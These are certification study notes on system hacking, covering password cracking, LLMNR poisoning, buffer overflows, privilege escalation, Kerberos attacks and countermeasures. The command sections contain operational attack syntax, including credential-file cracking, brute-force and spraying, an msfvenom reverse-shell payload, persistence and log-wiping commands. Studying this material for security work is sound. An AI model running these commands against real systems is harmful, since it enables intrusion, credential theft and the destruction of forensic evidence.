# Module 06: System Hacking

## Tier 1: Core Concepts & Principles

### System Hacking Methodology & Operational Lifecycle
* **System Hacking Phase:** The 4th phase of ethical hacking (following Reconnaissance, Scanning, and Enumeration). Involves actively establishing unauthorized access to a target host, escalating local execution privileges, establishing persistent access vectors, and sanitizing audit logs to bypass detection mechanisms.
* **Operational Lifecycle Stages:**
  * **Gaining Access:** Exploiting system vulnerabilities, capturing and cracking authentication credentials, executing buffer overflows, or poisoning name resolution requests.
  * **Escalating Privileges:** Elevating execution scope from standard or service accounts (`www-data`, `LOCAL SERVICE`) to administrative root access (`NT AUTHORITY\SYSTEM` or `root`).
  * **Maintaining Access:** Establishing persistent hooks (backdoors, registry startup keys, scheduled tasks, hijacked accessibility binaries) to survive system reboots and credential resets.
  * **Clearing Tracks:** Sanitizing Windows Event Logs, shredding command histories, timestomping metadata, and overwriting unallocated disk sectors to prevent detection by SOC, SIEM, or digital forensics teams.

### Password Attack Classifications
* **Dictionary Attack:** Sequentially tests pre-compiled lists of plaintext passwords (e.g., `rockyou.txt`).
* **Brute-Force Attack:** Systematically attempts every mathematical character combination ($A-Z$, $a-z$, $0-9$, special characters) until the correct password is identified.
* **Password Spraying Attack:** Tests one or two common passwords against hundreds/thousands of usernames to avoid triggering account lockout thresholds.
* **Hybrid Attack:** Combines dictionary base words with character mutations, appended numbers, or symbols (e.g., `Password123!`).
* **Rule-Based Attack:** Programmatically applies transformation rules (leetspeak replacement, case swapping, character insertion, word reversal) to input wordlists.
* **Rainbow Table Attack:** Performs instant $O(1)$ lookups against precomputed tables containing plaintext password strings and hash lookup chains.
  * **Primary Countermeasure:** **Salting** (appending a unique random string to the plaintext password prior to hashing) changes the final hash output and completely invalidates precomputed lookup tables.

---

## Tier 2: Technical Analysis & Mechanics

### Name Resolution Poisoning & NTLM Exploitation
* **LLMNR / NBT-NS Poisoning:** Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are fallback name resolution protocols used when primary DNS resolution fails.
  * *Attack Mechanism:* An attacker uses **Responder** to passively listen for broadcast queries on the local subnet and spoof responses, harvesting NetNTLMv1/v2 hashes.
* **NTLM Relay Attack:** Intercepts captured NetNTLM authentication responses and relays them directly to another target host over SMB or HTTP to gain unauthorized access without needing to crack the hash offline.
* **Pass-the-Hash (PtH):** Uses captured NTLM hashes directly to authenticate to remote SMB/RDP systems without converting or cracking them to plaintext.

### Buffer Overflow Mechanics & CPU Memory Architecture
* **Stack Memory Structure:** Last-In, First-Out (LIFO) memory structure containing local function variables, parameter listings, and control pointers.
* **Key x86 Architecture Registers:**
  * **ESP (Extended Stack Pointer):** Points to the top memory address of the current stack frame.
  * **EBP (Extended Base Pointer):** Points to the base address of the current stack frame.
  * **EIP (Extended Instruction Pointer):** Holds the memory address of the **next CPU instruction** to be executed (*Primary Attack Control Target*).
* **Memory Defense Mechanisms:**
  * **ASLR (Address Space Layout Randomization):** Randomizes memory addresses of executable loading points, stack, and heap locations across system reboots to stop static address jumps.
  * **DEP / NX Bit (Data Execution Prevention / No-Execute Bit):** Marks memory regions (such as the stack) as non-executable to prevent dynamic shellcode execution from injected buffers.
  * **SafeSEH & Stack Canaries:**
    * *SafeSEH:* Validates Structured Exception Handling targets prior to execution.
    * *Stack Canaries:* Places secret values directly before the instruction pointer; if overwritten during a buffer overflow, the process terminates instantly.
* **5-Step Buffer Overflow Exploitation Lifecycle:**
  1. **Fuzzing:** Inject incrementally larger data strings (e.g., repeating `A` / `\x41` characters) into an input parameter until the application crashes and overwrites CPU registers.
  2. **Finding the EIP Offset:** Generate a non-repeating cyclic pattern to determine the exact byte offset required to overwrite `EIP`. Calculate the offset from the crashed `EIP` hexadecimal value.
  3. **Bad Character Identification:** Send all hex values (`\x01` through `\xff`) in the payload to identify characters truncated or mangled by application logic. The null byte (`\x00`) is universally a bad character as it serves as a C string terminator.
  4. **Locating a JMP ESP Address:** Use Immunity Debugger or x64dbg with `mona.py` to identify a dynamic link library (`.dll`) compiled without ASLR, SafeSEH, or Rebase protections.
  5. **Payload Generation & Construction:** Generate encoded shellcode excluding bad characters. Construct payload using structure: `[ Padding (Offset) ] + [ JMP ESP Pointer ] + [ NOP Sled (\x90) ] + [ Shellcode ]`.

### Local Privilege Escalation Vectors
* **Windows Privilege Escalation:**
  * **UAC Bypass:** Bypassing UAC prompts by exploiting auto-elevating binaries (e.g., `fodhelper.exe`, `computerdefaults.exe`) or hijacking vulnerable COM objects.
  * **Token Impersonation (Potato Class Exploits):** Abusing process privileges assigned to service accounts, specifically `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (e.g., **JuicyPotato**, **RoguePotato**, **PrintSpoofer**, **SweetPotato**).
  * **Unquoted Service Paths:** Occurs when a Windows service path contains spaces and lacks double quotes (e.g., `C:\Program Files\My Service\service.exe`).
    * *Execution Sequence Attempted by Windows:*
      1. `C:\Program.exe`
      2. `C:\Program Files\My.exe`
      3. `C:\Program Files\My Service\service.exe`
    * If write permissions exist at `C:\`, placing `Program.exe` yields system privilege execution upon service restart.
  * **Weak Service Permissions:** Directly overwriting binary executables associated with system services when write permissions are granted to `BUILTIN\Users` or `EVERYONE`.
* **Linux Privilege Escalation:**
  * **SUID / SGID Executable Exploitation:** Executables configured with the Set-User-ID bit (`-rwsr-xr-x`) run under the security context of the file owner (`root`) rather than the executing user. Cross-referenced against **GTFOBins** for shell breakouts.
  * **Sudo Misconfigurations (`/etc/sudoers`):** Inspecting rules via `sudo -l`. Misconfigurations like `(ALL : ALL) NOPASSWD: /usr/bin/find` allow instant shell breakouts to `root`.

### Active Directory & Kerberos Exploitation Mechanisms
* **AS-REP Roasting:** Targets Active Directory accounts that have the `Do not require Kerberos preauthentication` flag enabled (`DONT_REQ_PREAUTH`). An attacker requests an AS-REP ticket, extracts the encrypted ticket portion, and cracks the password hash offline.
* **Kerberoasting:** Targets domain accounts mapped to a **Service Principal Name (SPN)** (e.g., service accounts for `MSSQLSvc` or `HTTP`). Any authenticated domain user can request a Kerberos TGS ticket for an SPN, extract the encrypted ticket blob, and crack it offline to recover the service account password.
* **Golden Ticket Attack:** Forges a Ticket Granting Ticket (TGT) using the compromised `krbtgt` user account hash, granting persistent full Domain Admin permissions across the entire Active Directory forest.
* **Silver Ticket Attack:** Forges a Ticket Granting Service (TGS) ticket using a compromised target service account hash, granting access exclusively to that specific service (e.g., MSSQL or CIFS).

---

## Tier 3: CLI, Tools & Framework Syntax

### Password Cracking & Name Resolution Poisoning
```bash
# Unshadow Linux /etc/passwd and /etc/shadow for cracking
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Responder: Listen on interface eth0 for LLMNR/NBT-NS/mDNS queries
responder -I eth0 -dwv

# John the Ripper: Wordlist attack against unshadowed or NTLM hashes
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Hashcat: Crack NTLM Hashes (Mode 1000)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat: Crack Kerberos 5 TGS-REP Hashes (Kerberoasting - Mode 13100)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat: Crack Kerberos 5 AS-REP Hashes (AS-REP Roasting - Mode 18200)
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Hydra: Dictionary attack against SMB services
hydra -L users.txt -P passwords.txt smb://192.168.1.50

# Hydra: Brute-force attack against Remote Desktop Protocol (RDP)
hydra -l Administrator -P passwords.txt rdp://192.168.1.50
```

### Buffer Overflow Tools & Metasploit Commands
```bash
# Metasploit Tool: Generate a 3000-byte non-repeating cyclic pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Metasploit Tool: Query exact offset from crashed EIP value (e.g., 39694438)
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438

# Mona.py (Immunity Debugger / x64dbg): List modules and find JMP ESP instructions
!mona modules
!mona jmp -r esp -m essfunc.dll

# Msfvenom: Generate Windows reverse TCP payload excluding bad characters (\x00\x0a\x0d)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -f c
```

### Linux Privilege Escalation & Active Directory Enumeration
```bash
# Linux: Find SUID binaries owned by root
find / -perm -4000 -type f 2>/dev/null

# Linux: Check permitted sudo commands for current user
sudo -l

# Active Directory Enumeration (PowerView)
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroupMember -Group "Domain Admins"
Get-NetComputer

# Active Directory Enumeration (CrackMapExec / NetExec)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2026!' --continue-on-success

# Impacket: AS-REP Roasting (GetNPUsers)
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass

# Impacket: Kerberoasting (GetUserSPNs)
python3 GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt
```

### Maintaining Access & Anti-Forensics Syntax
```powershell
# Windows Persistence: Metasploit Local Persistence Module
use exploit/windows/local/persistence
set SESSION 1
set LHOST 192.168.1.10
run

# Windows Track Clearing: Clear System and Security logs via PowerShell
Clear-EventLog -LogName System, Security, Application

# Windows Track Clearing: Clear System and Security logs via Command Prompt
wevtutil cl System
wevtutil cl Security

# Windows Forensic Evasion: Overwrite unallocated disk space
cipher /w:C:\

# Linux Track Clearing: Disable history file and shred existing bash history
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
history -c && history -w
shred -u ~/.bash_history
```

---

## Tier 4: Real-World Scenarios & Countermeasures

### System Hardening & Authentication Controls
* **Mitigating Password & Poisoning Attacks:**
  * Enforce complex, long passwords and mandatory Multi-Factor Authentication (MFA) to neutralize spray and dictionary attacks.
  * Disable LLMNR and NBT-NS protocols via Group Policy Object (GPO) to prevent broadcast poisoning via Responder.
  * Enable SMB Signing across network hosts to mitigate NTLM Relay attacks.
* **Buffer Overflow Mitigations:**
  * Compile all internal binaries with ASLR, DEP/NX Bit, SafeSEH, and compiler Stack Canaries enabled.
  * Utilize memory-safe code functions (e.g., `strncpy` instead of `strcpy`) to validate buffer boundaries.
* **Privilege Escalation & Active Directory Hardening:**
  * Apply strict File System Access Control Lists (FACL) on service directories and ensure all service binaries reside inside properly quoted paths (`"C:\Program Files\..."`).
  * Remove `SeImpersonatePrivilege` from non-administrative service accounts where not strictly necessary.
  * Enforce strong, 25+ character passwords for accounts assigned Service Principal Names (SPNs) to neutralize Kerberoasting.
  * Require Kerberos pre-authentication (`DONT_REQ_PREAUTH` disabled) on all Active Directory account objects to block AS-REP Roasting.
  * Restrict access to the `krbtgt` account and routinely rotate the `krbtgt` password twice to invalidate forged Golden Tickets.
* **Anti-Forensics & Persistence Defense:**
  * Implement centralized SIEM log collection (e.g., forwarding Windows Event IDs 1102 / 4719) so log deletion on local hosts is captured immediately.
  * Monitor accessibility execution paths (`sethc.exe`, `utilman.exe`) using File Integrity Monitoring (FIM) and Sysmon.

---

## Tier 5: Exam Key Hooks & Rapid Triggers

| Concept / Mechanism | High-Yield Exam Trigger | Critical Distinction |
| :--- | :--- | :--- |
| **Salting** | Defeats precomputed Rainbow Table lookup chains | Appends unique random string to plaintext prior to hashing; invalidates precomputed tables |
| **Responder** | LLMNR / NBT-NS broadcast poisoning tool | Listens on local subnet for failed DNS lookups; spoofs responses to capture NetNTLM hashes |
| **Pass-the-Hash (PtH)** | Authenticate over SMB/RDP using raw NTLM hash | Requires no plaintext cracking; uses NTLM hash directly to authenticate |
| **EIP Register** | Extended Instruction Pointer in x86 architecture | Holds memory address of the next CPU instruction to execute; primary target in buffer overflows |
| **ASLR vs. DEP/NX** | Address Space Randomization vs. Non-Executable Stack | ASLR randomizes memory addresses; DEP marks stack memory non-executable to block shellcode execution |
| **NOP Sled (`\x90`)** | Slide zone preceding shellcode payload | Provides safe landing area when EIP jumps into stack memory near execution payload |
| **Unquoted Service Path** | Path with spaces lacking quotation marks (e.g., `C:\Program Files\...`) | Windows attempts executing higher-level executable matches (`C:\Program.exe`) before full path |
| **Potato Exploits** | Elevates `SeImpersonatePrivilege` to `SYSTEM` | Exploits token impersonation on Windows service accounts (JuicyPotato, PrintSpoofer) |
| **GTFOBins** | Unix/Linux SUID and sudo shell breakout repository | Curated list of Unix binaries usable to bypass security restrictions via SUID or misconfigured sudo |
| **AS-REP Roasting** | Accounts configured with `DONT_REQ_PREAUTH` | Requests AS-REP ticket without knowing password; cracks encrypted ticket offline via Hashcat 18200 |
| **Kerberoasting** | Targets domain accounts associated with SPNs | Any domain user requests TGS ticket for an SPN; cracks ticket offline via Hashcat 13100 |
| **Golden Ticket Attack** | Compromises `krbtgt` NTLM account hash | Forges TGT ticket; provides persistent, complete forest-wide Domain Admin access |
| **Silver Ticket Attack** | Compromises specific service account hash | Forges TGS ticket; grants access exclusively to the specific targeted service |
| **Sticky Keys Hijack** | 5x SHIFT key activation at Windows lock screen | Replaces `sethc.exe` with `cmd.exe` to spawn an unauthenticated `NT AUTHORITY\SYSTEM` prompt |
| **`cipher /w:C:\`** | Overwrites unallocated disk sectors | Windows native utility command used to wipe deleted file data in unallocated disk space |